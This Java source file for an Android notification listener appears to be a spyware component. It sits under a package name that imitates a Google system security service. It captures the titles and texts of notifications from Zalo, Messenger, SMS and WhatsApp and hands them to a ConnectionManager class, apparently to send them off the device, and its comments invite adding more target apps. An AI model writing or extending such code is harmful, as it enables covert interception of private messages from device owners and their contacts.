package com.google.android.sys.security;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.util.Log;
import org.json.JSONObject;

public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;

        String title = extras.getString(Notification.EXTRA_TITLE);
        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
        
        // Filter for relevant apps (Zalo, Messenger, SMS)
        // You can add more package names here
        if (packageName.equals("com.zing.zalo") || 
            packageName.equals("com.facebook.orca") || 
            packageName.equals("com.google.android.apps.messaging") ||
            packageName.equals("com.whatsapp")) {
            
            try {
                JSONObject data = new JSONObject();
                data.put("package", packageName);
                data.put("title", title != null ? title : "Unknown");
                data.put("text", text != null ? text.toString() : "");
                data.put("time", System.currentTimeMillis());

                ConnectionManager.sendNotification(data);
                Log.d("NotificationService", "Caught notification from: " + packageName);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed for now
    }
}
